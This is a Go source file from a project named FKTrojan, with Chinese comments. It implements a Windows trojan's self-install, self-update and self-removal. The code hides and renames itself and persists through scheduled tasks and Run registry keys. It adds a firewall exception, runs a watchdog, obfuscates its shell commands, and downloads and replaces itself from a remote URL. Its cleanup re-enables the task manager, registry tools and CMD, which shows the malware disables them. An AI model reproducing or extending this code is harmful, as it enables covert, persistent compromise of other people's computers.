/*
Author: FreeKnight
软件自安装，卸载和更新
*/
//------------------------------------------------------------
package components

import (
	"FKTrojan/common"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"syscall"
	"time"

	"errors"

	"golang.org/x/sys/windows/registry"
	"path/filepath"
)

//------------------------------------------------------------
// 《论一个软件的自我安装》
func install() {
	// 随机一个名字
	rand.Seed(time.Now().UTC().UnixNano())
	var myRandomExeName = installNames[rand.Intn(len(installNames))]
	var myRegistryName = registryNames[rand.Intn(len(registryNames))]

	myInstallReg = myRegistryName
	myExeName = myRandomExeName

	FKDebugLog("Registry Name : " + myInstallReg)
	FKDebugLog("Exe Name : " + myExeName)

	// 检查国家让不让安装
	if !canThisCountryInstalled() {
		FKDebugLog("This ip belongs to a country that we don't allow to install.")
	} else {
		// 拷贝修改本文件
		copyExeCmd := exec.Command("cmd", "/Q", "/C", "move", "/Y", os.Args[0], tmpAppDataInstallDir+myRandomExeName+".exe")
		copyExeCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_, _ = copyExeCmd.Output()

		// 从备份源进行拷贝
		_ = copyFileToDirectory(os.Args[0], winDirPath+myRandomExeName+".exe")
		dir, _ := filepath.Split(os.Args[0])
		// 拷贝附属文件
		copyFileToDirectory(dir+configFile, winDirPath+configFile)
		copyFileToDirectory(dir+anvirConfigFile, winDirPath+anvirConfigFile)
		copyFileToDirectory(dir+anvirExeFile, winDirPath+anvirExeFile)

		// 删除windows傻逼的Zone Identifier文件
		_ = os.Remove(tmpAppDataInstallDir + myRandomExeName + common.Deobfuscate("/fyf;[pof/Jefoujgjfs"))

		if isAdmin {
			// nice job!获取了管理员权限

			// 要求启动计划任务，在每次启动时打开本进程
			cmd1 := fmt.Sprintf(`SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /TR %s /TN %s /F`, winDirPath+myRandomExeName+".exe", "HKLM\\"+registryAutoRunPath+"\\"+myRandomExeName)
			CommandWork := exec.Command("cmd", "/C", cmd1)
			CommandWork.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			_, _ = CommandWork.Output()
			// 添加防火墻信任
			if autofirwall {
				addFileToFirewall(myRandomExeName, os.Args[0])
			}
		} else {
			// 可怜，没有管理员权限

			// 只能讓註冊表進行啟動了
			_ = writeRegistryKey(registry.CURRENT_USER, registryAutoRunPath, myRandomExeName, tmpAppDataInstallDir+myRandomExeName+".exe")
		}
		// 無聊就寫註冊表玩
		writeRegCmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\"+myRegistryName, "/f")
		writeRegCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		_, _ = writeRegCmd.Output()
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "ID", common.Obfuscate(myUID))
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "INSTALL", curTime)
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "NAME", common.Obfuscate(myRandomExeName))
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "VERSION", clientVersion)
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "REMASTER", "nil")
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myRegistryName+"\\", "LAST", "")
		// 隱藏本文件
		hideFile(winDirPath + myRandomExeName + ".exe")
		hideFile(winDirPath+anvirExeFile)
		hideFile(winDirPath+anvirConfigFile)
		hideFile(winDirPath+configFile)

		FKDebugLog("Install myself success.")
	}
	// 主动防御
	if activeDefense {
		// 拷贝看门狗程序
		_ = copyFileToDirectory(os.Args[0], tmpAppDataInstallDir+watchdogName+".exe")
		hideFile(tmpAppDataInstallDir+watchdogName+".exe")
		// 开启看门狗
		_ = writeRegistryKey(registry.CURRENT_USER, registryAutoRunPath, watchdogName, tmpAppDataInstallDir+watchdogName+".exe")
	}
}

//------------------------------------------------------------
// 软件的自我更新
// 例如：update("ArchNun", "http://www.filehost.com/fkTrojen.upt", "false")
// 最后一个参数也可以是文件的MD5值。false表示不检查该项了
func update(version, file, md5 string) (string, error) {
	if version == clientVersion {
		return "", errors.New("Same verison, don't need to update.") // 版本相同，恕不更新
	}

	var myPath string
	if isAdmin {
		myPath = winDirPath
	} else {
		myPath = tmpAppDataInstallDir
	}

	n := randomString(5, false)
	output, err := os.Create(tmpAppDataInstallDir + n + ".exe")
	if err != nil {
		return "", err
	}
	defer output.Close()
	response, err1 := http.Get(file)
	if err1 != nil {
		return "", err1
	}
	defer response.Body.Close()
	_, err2 := io.Copy(output, response.Body)
	if err2 != nil {
		return "", err2
	}

	//删除冗余的Windows Zone ID
	_ = os.Remove(tmpAppDataInstallDir + n + ".exe" + common.Deobfuscate("/fyf;[pof/Jefoujgjfs"))

	if md5 != "false" {
		if string(common.Md5HashFile(tmpAppDataInstallDir+n+"."+n)) != md5 {
			return "", errors.New("New file md5 is not right.") // 抱歉，新文件没通过审查
		}
	}

	// 关闭主动防御
	activeDefense = false
	// 关闭看门狗
	_, err = killThirdExe(watchdogName + ".exe")
	if err != nil {
		return "", err
	}
	// 移除老文件
	goodbye := exec.Command("cmd", "/Q", "/C", common.Deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+os.Args[0]) //4000
	goodbye.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = goodbye.Start()
	if err != nil {
		return "", err
	}

	// 添加新文件到指定目录
	movenew := exec.Command("cmd", "/Q", "/C", common.Deobfuscate("qjoh!2/2/2/2!.o!2!.x!5161!?!Ovm!'!npwf!0Z!")+tmpAppDataInstallDir+n+".exe "+myPath+myExeName+".exe") //4050
	movenew.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = movenew.Start()
	if err != nil {
		return "", err
	}

	defer os.Exit(0)
	return "Update successed.", nil
}

//------------------------------------------------------------
// 软件的自我清除
func uninstall() (string, error) {
	_, err := getRegistryKeyValue(registry.CURRENT_USER, "Software\\", myInstallReg)
	if err != nil {
		return "", err
	}
	// 恢复Host
	_, err = editHost("", true)
	if err != nil {
		return "", err
	}
	// 关闭主动防御
	activeDefense = false
	// 关闭看门狗
	_, err = killThirdExe(watchdogName + ".exe")
	if err != nil {
		return "", err
	}
	goodbyedog := exec.Command("cmd", "/Q", "/C", common.Deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+tmpAppDataInstallDir+watchdogName+".exe")
	goodbyedog.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = goodbyedog.Start()
	if err != nil {
		return "", err
	}

	// 注册表清除恢复
	err = deleteRegistryKey(registry.CURRENT_USER, registryAutoRunPath, myExeName)
	err = deleteRegistryKey(registry.CURRENT_USER, "Software\\", myInstallReg)
	err = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableTaskMgr", "0")       //0 = on|1 = off
	err = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableRegistryTools", "0") //0 = on|1 = off
	err = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableCMD", "0")           //0 = on|1 = off
	if err != nil {
		return "", err
	}

	// 删除运行任务
	rmtask := exec.Command("cmd", "/Q", "/C", `SchTasks /Delete /TN `+"HKLM\\"+registryAutoRunPath+"\\"+myExeName)
	rmtask.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = rmtask.Start()
	if err != nil {
		return "", err
	}

	// 删除Log
	goodbye := exec.Command("cmd", "/Q", "/C", common.Deobfuscate("qjoh!2/2/2/2!.o!2!.x!5111!?!Ovm!'!Efm!")+os.Args[0])
	goodbye.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = goodbye.Start()
	if err != nil {
		return "", err
	}

	// 再见~~~~~goodbye,world!
	return "Uninstall successed.", nil
}
